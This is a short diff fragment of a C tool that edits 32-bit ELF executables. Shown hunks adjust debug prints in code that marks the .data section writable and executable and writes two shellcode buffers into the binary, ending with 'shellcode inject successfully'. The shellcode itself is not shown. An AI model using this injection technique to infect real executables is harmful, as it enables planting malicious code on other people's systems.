@@ -135,7 +135,7 @@ int main(int argc,char *argv[])
     uint32_t shstr_off = sh_table[eh->e_shstrndx].sh_offset;
     fseek(fd,shstr_off,SEEK_SET);
     char* pstr = fd->_IO_read_ptr;
-    printf(".shstrtab data begin on 0x%x\n",*pstr);
+    printf(".shstrtab data begin on 0x%x\n",shstr_off);
     
     // get some necessary section information
     int i = 0;
@@ -164,7 +164,7 @@ int main(int argc,char *argv[])
             // change the privilege of .data
             fseek(fd,eh->e_shoff+(i*sizeof(Elf32_Shdr))+8,SEEK_SET);
             fwrite(&privi,sizeof(uint32_t),1,fd);
-            printf("change the .data section privilege to 0x%x\n",*fd->_IO_read_ptr);
+            printf("change the .data section privilege to 0x7\n");
             br++;
         }
         else if(!strcmp(pstr + sh_table[i].sh_name,".dynsym"))
@@ -380,7 +380,7 @@ int main(int argc,char *argv[])
 
     fseek(fd,dll_addr,SEEK_SET);
     fwrite(shellcode1,sizeof(shellcode1),1,fd);
-    rewind(fd);
+
     fseek(fd,insert_waddr,SEEK_SET);
     fwrite(shellcode2,sizeof(shellcode2),1,fd);
     printf("shellcode inject successfully");
